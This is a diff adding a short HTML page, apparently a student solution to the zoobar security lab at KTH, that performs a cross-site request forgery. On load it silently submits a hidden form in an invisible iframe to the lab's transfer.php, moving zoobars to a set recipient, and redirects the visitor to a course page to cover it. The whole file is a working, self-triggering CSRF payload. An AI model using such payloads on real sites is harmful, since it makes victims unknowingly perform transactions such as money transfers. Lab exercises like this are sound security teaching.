@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+  <iframe style="display:none" name="csrf-frame"></iframe>
+  <form name="csrf-form" method='POST' action='http://dasak.csc.kth.se/zoobar/transfer.php' target="csrf-frame" id="csrf-form">
+    <input name="zoobars" value="1" size="5" type="hidden" >
+    <input name="recipient" value="aaaaaaaaaa" size="10" type="hidden">
+    <input name="submission" value="Redirect" type="hidden">
+
+  </form>
+
+  <script>
+  window.location.replace("https://kth.instructure.com/courses/3497")
+  window.onload = document.getElementById("csrf-form").submit();
+
+</script>
+</body>
+</html>
